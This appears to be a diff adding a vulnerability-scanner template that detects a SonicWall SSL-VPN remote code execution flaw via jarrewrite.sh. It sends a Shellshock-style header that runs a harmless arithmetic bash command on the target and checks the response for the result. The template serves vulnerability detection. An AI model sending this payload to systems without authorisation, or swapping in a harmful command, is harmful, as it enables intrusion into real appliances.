@@ -1,0 +1,28 @@
+id: sonicwall-sslvpn-jarrewrite-rce
+info:
+  name: SonicWall SSL-VPN jarrewrite.sh RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Detects remote code execution vulnerability in SonicWall SSL-VPN during jarrewrite.sh processing.
+  reference:
+    - https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/
+variables:
+  r1: "{{rand_int(40000, 44800)}}"
+  r2: "{{rand_int(1140000, 1144800)}}"
+http:
+  - raw:
+      - |
+        GET /cgi-bin/jarrewrite.sh HTTP/1.1
+        Host: {{Hostname}}
+        X-Test: () { :; }; echo ; /bin/bash -c 'expr {{r1}} - {{r2}}'
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{to_number(r1) - to_number(r2)}}"
